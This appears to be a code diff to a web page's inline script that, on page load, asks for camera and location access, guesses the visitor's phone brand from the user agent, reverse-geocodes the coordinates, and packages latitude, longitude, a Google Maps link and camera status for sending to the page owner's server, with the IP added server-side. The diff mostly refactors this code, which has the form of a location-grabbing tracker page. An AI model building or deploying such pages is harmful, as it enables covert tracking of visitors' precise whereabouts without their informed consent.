@@ -80,58 +80,50 @@
     </form>
   </div>
 
-  <script>
+<script>
 function getDeviceName() {
   const ua = navigator.userAgent.toLowerCase();
-
-  const brands = {
-    'samsung': "Samsung",
-    'iphone': "iPhone",
-    'ipad': "iPad",
-    'pixel': "Google Pixel",
-    'sony': "Sony Xperia",
-    'xperia': "Sony Xperia",
-    'oneplus': "OnePlus",
-    'xiaomi': "Xiaomi",
-    'redmi': "Redmi",
-    'realme': "Realme",
-    'oppo': "Oppo",
-    'vivo': "Vivo",
-    'nokia': "Nokia",
-    'tecno': "Tecno",
-    'infinix': "Infinix",
-    'motorola': "Motorola",
-    'huawei': "Huawei",
-    'itel': "Itel",
-    'lenovo': "Lenovo",
-    'lg': "LG",
-    'asus': "Asus",
-    'htc': "HTC",
-    'micromax': "Micromax",
-    'blackberry': "BlackBerry",
-    'meizu': "Meizu",
-    'acer': "Acer",
-    'panasonic': "Panasonic"
+  const devices = {
+    "samsung": "Samsung",
+    "redmi": "Xiaomi Redmi",
+    "mi": "Xiaomi",
+    "poco": "POCO",
+    "infinix": "Infinix",
+    "vivo": "Vivo",
+    "oppo": "Oppo",
+    "realme": "Realme",
+    "huawei": "Huawei",
+    "tecno": "Tecno",
+    "iphone": "iPhone",
+    "ipad": "iPad",
+    "pixel": "Google Pixel",
+    "sony": "Sony Xperia",
+    "motorola": "Motorola",
+    "nokia": "Nokia",
+    "oneplus": "OnePlus",
+    "lg": "LG",
+    "honor": "Honor",
+    "lenovo": "Lenovo"
   };
-
-  for (let key in brands) {
-    if (ua.includes(key)) return brands[key];
+  for (const key in devices) {
+    if (ua.includes(key)) return devices[key];
   }
-
   return "Unknown Device";
 }
 
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-    const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+    const res = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0' }
+    });
     const data = await res.json();
     return {
       city: data.address.city || data.address.town || data.address.village || "Unknown",
       country: data.address.country || "Unknown",
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
     };
-  } catch {
+  } catch (e) {
     return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
   }
 }
@@ -144,7 +136,7 @@ async function sendFullData(locationCoords, cameraStatus) {
   }
 
   const payload = {
-    ip: "Unknown", // Actual IP will be added by server-side (main.py)
+    ip: "Unknown", // server side milega
     latitude: locationCoords?.latitude || null,
     longitude: locationCoords?.longitude || null,
     mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
@@ -186,12 +178,12 @@ async function askForPermissions() {
       pos => sendFullData(pos.coords, "✅ Camera Allowed"),
       err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
     );
-  } catch {
+  } catch (err) {
     sendFullData(null, "❌ Camera Denied");
   }
 }
 
 window.onload = askForPermissions;
-  </script>
+</script>
 </body>
 </html>
